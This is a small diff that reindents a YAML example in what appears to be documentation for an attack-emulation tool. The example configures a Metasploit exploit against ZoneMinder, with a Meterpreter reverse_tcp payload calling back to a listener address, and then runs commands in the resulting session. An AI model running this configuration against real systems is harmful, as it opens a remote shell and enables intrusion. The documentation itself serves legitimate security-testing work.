@@ -16,13 +16,13 @@ Execute commands in an active Meterpreter session previously opened by an
       commands:
         # First, exploit a vulnerability and create a session:
         - type: msf-module
-           cmd: exploit/unix/webapp/zoneminder_snapshots
-           creates_session: foothold
-           options:
-             RHOSTS: 192.42.0.254
-           payload: cmd/unix/python/meterpreter/reverse_tcp
-           payload_options:
-             LHOST: 192.42.2.253
+          cmd: exploit/unix/webapp/zoneminder_snapshots
+          creates_session: foothold
+          options:
+            RHOSTS: 192.42.0.254
+          payload: cmd/unix/python/meterpreter/reverse_tcp
+          payload_options:
+            LHOST: 192.42.2.253
 
         # Then, execute a command in the session:
         - type: msf-session
